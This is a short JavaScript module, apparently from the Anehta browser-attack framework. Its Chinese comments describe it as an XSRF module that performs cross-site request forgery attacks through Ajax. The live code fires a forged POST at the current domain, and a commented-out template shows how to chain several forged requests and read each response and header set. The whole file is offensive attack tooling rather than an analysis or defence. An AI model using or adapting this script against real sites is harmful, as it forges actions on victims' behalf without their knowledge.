//alert("xsrf.js");
////////////////////////////////////////////////
// XSRF 模块,通过 Ajax 实施XSRF攻击
// Author: axis
////////////////////////////////////////////////

/// 开始执行功能
if (xmlhttp.init()) {
  anehta.ajax.post("http://"+$d.domain, "");
  //anehta.ajax.get("http://"+$d.domain+"/fvck");
}

/////////////////////////////////////////////////////
//// 如果需要嵌套调用,比如step1->step2->step3
//// 则需要像如下调用
/*
if (xmlhttp.init()) {
	////// 第一个包
  // 第二个参数是提交的参数,第三个参数是headers
	xmlhttp.post("http://"+$d.domain, "", null, function(response, responseHeaders) {
		if (responseHeaders != null) {
			alert(responseHeaders);
		}
    
		if (response != null) {
			alert(response);
		}
		
		///// 根据返回结果处理,并提交第二个包
		xmlhttp.post("http://"+$d.domain+"/fvck", "", null, function(response, responseHeaders) {
		  if (responseHeaders != null) {
			  alert(responseHeaders);
		  }
    
		  if (response != null) {
			  alert(response);
		  }
		
		  ///// 根据返回结果处理,并提交第三个包
		  ///////  ......  
     
	  });    
     
	});
}
*/